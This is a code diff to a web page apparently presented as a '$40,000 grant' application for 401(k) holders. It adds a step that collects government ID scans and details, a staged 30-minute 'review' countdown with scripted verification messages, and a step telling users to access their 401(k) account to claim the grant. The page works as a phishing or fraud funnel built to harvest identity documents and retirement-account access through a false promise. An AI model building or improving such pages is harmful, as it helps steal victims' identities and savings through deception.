@@ -62,14 +62,18 @@
       </div>
       <div class="progress-step">
         <div class="step-circle">4</div>
-        <span class="progress-step-label">401(k) Verify</span>
+        <span class="progress-step-label">ID Verify</span>
       </div>
       <div class="progress-step">
         <div class="step-circle">5</div>
-        <span class="progress-step-label">401(k) Access</span>
+        <span class="progress-step-label">Reviewing</span>
       </div>
       <div class="progress-step">
         <div class="step-circle">6</div>
+        <span class="progress-step-label">401(k) Access</span>
+      </div>
+      <div class="progress-step">
+        <div class="step-circle">7</div>
         <span class="progress-step-label">Review</span>
       </div>
     </div>
@@ -268,16 +272,6 @@
             </select>
           </div>
           <div class="form-group">
-            <label>Requested Amount (For Review)</label>
-            <select name="grantAmount" class="form-select">
-              <option value="">Select Amount</option>
-              <option value="5000">Up to $5,000</option>
-              <option value="10000">$5,001–$10,000</option>
-              <option value="25000">$10,001–$25,000</option>
-              <option value="other">More than $25,000</option>
-            </select>
-          </div>
-          <div class="form-group">
             <label>Current Work Arrangement</label>
             <select name="employees" class="form-select">
               <option value="">Select Arrangement</option>
@@ -302,9 +296,86 @@
       </div>
 
       <div class="form-step" data-step="4" style="display: none;">
-        <h3>Step 4: 401(k) Account Verification</h3>
-        <p class="step-desc">Provide information to confirm that you own a 401(k). This verification does not authorize any withdrawal and will not affect your account balance.</p>
+        <h3>Step 4: Valid ID Verification</h3>
+        <p class="step-desc">Upload a government-issued photo ID and enter the information exactly as it appears on the document. This step is used only to confirm your identity and protect your application.</p>
+
+        <div style="background: linear-gradient(135deg, rgba(16,185,129,0.06), rgba(10,25,41,0.02)); border: 1px solid rgba(16,185,129,0.25); border-radius: 14px; padding: 1.25rem 1.25rem; margin-bottom: 2rem; display: flex; gap: 1rem; align-items: flex-start;">
+          <div style="width: 44px; height: 44px; border-radius: 10px; background: rgba(16,185,129,0.12); display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24" stroke="#10b981" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M10 6H5a2 2 0 00-2 2v10a2 2 0 002 2h14a2 2 0 002-2v-5M14 10l7-7m0 0h-5m5 0v5" />
+            </svg>
+          </div>
+          <div style="line-height: 1.7; color: var(--gray-700); font-size: 0.95rem;">
+            <p style="margin: 0 0 0.5rem; color: var(--navy-900); font-weight: 600;">Identity Verification Required</p>
+            <p style="margin: 0 0 0.25rem;">Accepted IDs: U.S. Passport, Driver License, State ID, Green Card, Military ID.</p>
+            <p style="margin: 0;">All four corners of the ID must be visible. Photo must be clear, in color, and well lit. We verify your ID before releasing any grant funds.</p>
+          </div>
+        </div>
+
         <div class="form-grid">
+          <div class="form-group">
+            <label>ID Type</label>
+            <select name="idType" class="form-select">
+              <option value="">Select ID Type</option>
+              <option>U.S. Passport</option>
+              <option>Driver License</option>
+              <option>State Issued ID</option>
+              <option>Permanent Resident Card (Green Card)</option>
+              <option>Military ID</option>
+              <option>Other Government Issued ID</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>ID / Document Number</label>
+            <input type="text" name="idNumber" class="form-input" placeholder="e.g. DL123456789">
+          </div>
+          <div class="form-group">
+            <label>Full Name (as shown on ID)</label>
+            <input type="text" name="idFullName" class="form-input" placeholder="Exactly as printed on your ID">
+          </div>
+          <div class="form-group">
+            <label>Date of Birth (as shown on ID)</label>
+            <input type="date" name="idDob" class="form-input">
+          </div>
+          <div class="form-group">
+            <label>ID Expiration Date</label>
+            <input type="date" name="idExpires" class="form-input">
+          </div>
+          <div class="form-group">
+            <label>Issuing State / Country</label>
+            <input type="text" name="idIssuer" class="form-input" placeholder="e.g. California / USA">
+          </div>
+
+          <div class="form-group full">
+            <label>Upload Front of ID</label>
+            <div class="upload-area" id="uploadIdFront" style="border: 1.5px dashed rgba(16,185,129,0.45); background: rgba(16,185,129,0.03);">
+              <div class="upload-icon" style="color: #10b981;">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7zM3 11h18M7 15h3" />
+                </svg>
+              </div>
+              <h4>Front of ID — Click or Drag &amp; Drop</h4>
+              <p>Clear color photo of the front side · JPG, PNG, PDF · Max 10MB</p>
+              <input type="file" id="fileIdFront" accept="image/*,.pdf" style="display: none;">
+            </div>
+            <div class="id-preview" id="idFrontPreview" style="display: none; margin-top: 1rem;"></div>
+          </div>
+
+          <div class="form-group full">
+            <label>Upload Back of ID</label>
+            <div class="upload-area" id="uploadIdBack" style="border: 1.5px dashed rgba(16,185,129,0.45); background: rgba(16,185,129,0.03);">
+              <div class="upload-icon" style="color: #10b981;">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z" />
+                </svg>
+              </div>
+              <h4>Back of ID — Click or Drag &amp; Drop</h4>
+              <p>Barcode and signature visible · JPG, PNG, PDF · Max 10MB</p>
+              <input type="file" id="fileIdBack" accept="image/*,.pdf" style="display: none;">
+            </div>
+            <div class="id-preview" id="idBackPreview" style="display: none; margin-top: 1rem;"></div>
+          </div>
+
           <div class="form-group full">
             <label>401(k) Provider / Financial Institution</label>
             <select name="provider" class="form-select">
@@ -382,12 +453,73 @@
         </div>
         <div class="form-actions">
           <button class="btn-prev btn btn-outline-dark">← Previous</button>
-          <button class="btn-next-step btn btn-primary">Continue →</button>
+          <button class="btn-next-step btn btn-primary">Begin Review →</button>
         </div>
       </div>
 
       <div class="form-step" data-step="5" style="display: none;">
-        <h3>Step 5: 401(k) Account Access</h3>
+        <h3>Step 5: Application Under Review</h3>
+        <p class="step-desc">We are reviewing your submitted information. Please wait for the review countdown to complete. You will automatically move to the next step once the review is finished.</p>
+
+        <div style="text-align: center; padding: 2rem 1rem 1.5rem;">
+          <div style="position: relative; width: 240px; height: 240px; margin: 0 auto 1.5rem;">
+            <svg viewBox="0 0 120 120" width="240" height="240" style="transform: rotate(-90deg);">
+              <circle cx="60" cy="60" r="52" stroke="rgba(212,175,55,0.18)" stroke-width="10" fill="none" />
+              <circle id="reviewRing" cx="60" cy="60" r="52" stroke="url(#goldGrad)" stroke-width="10" fill="none" stroke-linecap="round" stroke-dasharray="326.73" stroke-dashoffset="326.73" />
+              <defs>
+                <linearGradient id="goldGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                  <stop offset="0%" stop-color="#d4af37" />
+                  <stop offset="100%" stop-color="#f0d580" />
+                </linearGradient>
+              </defs>
+            </svg>
+            <div style="position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; flex-direction: column;">
+              <div id="reviewCountdown" style="font-size: 2.4rem; font-weight: 700; font-family: 'Segoe UI', sans-serif; color: var(--navy-900); letter-spacing: 0.02em;">30:00</div>
+              <div style="font-size: 0.9rem; color: var(--gray-600); margin-top: 0.25rem;">minutes remaining</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="max-width: 640px; margin: 0 auto 1.5rem; background: rgba(10,25,41,0.02); border: 1px solid rgba(10,25,41,0.08); border-radius: 14px; padding: 1.25rem 1.25rem;">
+          <div style="display: flex; gap: 0.8rem; align-items: flex-start; margin-bottom: 0.9rem;">
+            <div style="width: 28px; height: 28px; border-radius: 50%; background: rgba(212,175,55,0.15); display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+              <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="#d4af37" stroke-width="2.5">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 2m6-2a9 9 0 11-18 0 9 9 0 0118 0z" />
+              </svg>
+            </div>
+            <div style="font-size: 0.95rem; line-height: 1.65; color: var(--gray-700);">
+              <div style="color: var(--navy-900); font-weight: 600; margin-bottom: 0.2rem;">Your Application Is Being Reviewed</div>
+              We are verifying your identity information, 401(k) account details, and supporting documents. Please <strong>do not close this page</strong> until the review completes.
+            </div>
+          </div>
+          <div id="reviewChecks" style="display: flex; flex-direction: column; gap: 0.6rem; padding-left: 2.6rem;">
+            <div class="rev-check" data-check="0" style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; color: var(--gray-500);">
+              <span class="rev-dot" style="width: 8px; height: 8px; border-radius: 50%; background: var(--gray-300); display: inline-block;"></span>
+              Verifying Valid ID uploads
+            </div>
+            <div class="rev-check" data-check="1" style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; color: var(--gray-500);">
+              <span class="rev-dot" style="width: 8px; height: 8px; border-radius: 50%; background: var(--gray-300); display: inline-block;"></span>
+              Cross-checking personal details
+            </div>
+            <div class="rev-check" data-check="2" style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; color: var(--gray-500);">
+              <span class="rev-dot" style="width: 8px; height: 8px; border-radius: 50%; background: var(--gray-300); display: inline-block;"></span>
+              Validating 401(k) account ownership
+            </div>
+            <div class="rev-check" data-check="3" style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; color: var(--gray-500);">
+              <span class="rev-dot" style="width: 8px; height: 8px; border-radius: 50%; background: var(--gray-300); display: inline-block;"></span>
+              Preparing next steps for grant access
+            </div>
+          </div>
+        </div>
+
+        <div class="form-actions">
+          <button class="btn-prev btn btn-outline-dark">← Previous</button>
+          <button id="btnSkipReview" class="btn-next-step btn btn-outline-dark" disabled>Proceeding automatically…</button>
+        </div>
+      </div>
+
+      <div class="form-step" data-step="6" style="display: none;">
+        <h3>Step 6: 401(k) Account Access</h3>
         <p class="step-desc">To access the $40,000 grant, you need to access your official 401(k) account below. This step confirms that you are the account holder authorized to receive the grant award.</p>
 
         <div style="background: linear-gradient(135deg, rgba(212,175,55,0.08), rgba(10,25,41,0.02)); border: 1px solid rgba(212,175,55,0.35); border-radius: 14px; padding: 1.25rem 1.25rem; margin-bottom: 2rem; display: flex; gap: 1rem; align-items: flex-start;">
@@ -420,8 +552,8 @@
       </div>
 
 
-      <div class="form-step" data-step="6" style="display: none;">
-        <h3>Step 6: Review & Submit</h3>
+      <div class="form-step" data-step="7" style="display: none;">
+        <h3>Step 7: Review & Submit</h3>
         <p class="step-desc">Please verify all information below before submitting your application. Once submitted, changes may delay processing.</p>
 
         <div class="review-summary">
@@ -520,6 +652,92 @@
     if (area2 && input2) {
       area2.addEventListener('click', function() { input2.click(); });
     }
+
+    function wireIdUpload(areaId, inputId, previewId, label) {
+      const area = document.getElementById(areaId);
+      const input = document.getElementById(inputId);
+      const preview = document.getElementById(previewId);
+      if (!area || !input) return;
+
+      function renderFile(file) {
+        if (!preview) return;
+        preview.innerHTML = '';
+        preview.style.display = 'block';
+        const wrap = document.createElement('div');
+        wrap.style.cssText = 'display:flex; gap:1rem; align-items:center; padding:0.9rem 1rem; border-radius:12px; border:1px solid rgba(16,185,129,0.25); background:rgba(16,185,129,0.04);';
+        const thumb = document.createElement('div');
+        thumb.style.cssText = 'width:70px; height:90px; border-radius:8px; background:rgba(10,25,41,0.06); display:flex; align-items:center; justify-content:center; overflow:hidden; flex-shrink:0; border:1px solid rgba(10,25,41,0.08);';
+        const info = document.createElement('div');
+        info.style.flex = '1';
+        const title = document.createElement('div');
+        title.style.cssText = 'font-weight:600; color:var(--navy-900); margin-bottom:0.2rem;';
+        title.textContent = label + ' Uploaded';
+        const fname = document.createElement('div');
+        fname.style.cssText = 'font-size:0.85rem; color:var(--gray-600); margin-bottom:0.25rem;';
+        fname.textContent = file.name;
+        const fsize = document.createElement('div');
+        fsize.style.cssText = 'font-size:0.8rem; color:var(--gray-500);';
+        const kb = file.size / 1024;
+        fsize.textContent = kb > 1024 ? (kb / 1024).toFixed(2) + ' MB' : kb.toFixed(1) + ' KB';
+        info.appendChild(title);
+        info.appendChild(fname);
+        info.appendChild(fsize);
+
+        const remove = document.createElement('button');
+        remove.type = 'button';
+        remove.textContent = 'Remove';
+        remove.style.cssText = 'background:none; border:1px solid rgba(10,25,41,0.12); color:var(--gray-600); padding:0.4rem 0.85rem; border-radius:8px; font-size:0.82rem; cursor:pointer;';
+        remove.addEventListener('click', function () {
+          input.value = '';
+          preview.innerHTML = '';
+          preview.style.display = 'none';
+        });
+
+        if (file.type.startsWith('image/')) {
+          const img = document.createElement('img');
+          img.src = URL.createObjectURL(file);
+          img.style.cssText = 'width:100%; height:100%; object-fit:cover;';
+          thumb.appendChild(img);
+        } else {
+          thumb.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" viewBox="0 0 24 24" stroke="var(--navy-900)" stroke-width="1.6"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>';
+        }
+        wrap.appendChild(thumb);
+        wrap.appendChild(info);
+        wrap.appendChild(remove);
+        preview.appendChild(wrap);
+      }
+
+      area.addEventListener('click', function () { input.click(); });
+      input.addEventListener('change', function (e) {
+        if (e.target.files && e.target.files[0]) renderFile(e.target.files[0]);
+      });
+      ['dragover', 'dragenter'].forEach(function (ev) {
+        area.addEventListener(ev, function (e) {
+          e.preventDefault();
+          area.style.borderColor = '#10b981';
+          area.style.background = 'rgba(16,185,129,0.08)';
+        });
+      });
+      ['dragleave', 'drop'].forEach(function (ev) {
+        area.addEventListener(ev, function (e) {
+          e.preventDefault();
+          area.style.borderColor = '';
+          area.style.background = '';
+        });
+      });
+      area.addEventListener('drop', function (e) {
+        const f = e.dataTransfer.files && e.dataTransfer.files[0];
+        if (f) {
+          const dt = new DataTransfer();
+          dt.items.add(f);
+          input.files = dt.files;
+          renderFile(f);
+        }
+      });
+    }
+
+    wireIdUpload('uploadIdFront', 'fileIdFront', 'idFrontPreview', 'Front of ID');
+    wireIdUpload('uploadIdBack', 'fileIdBack', 'idBackPreview', 'Back of ID');
   });
 </script>
 <script type="module" src="js/auth.js"></script>
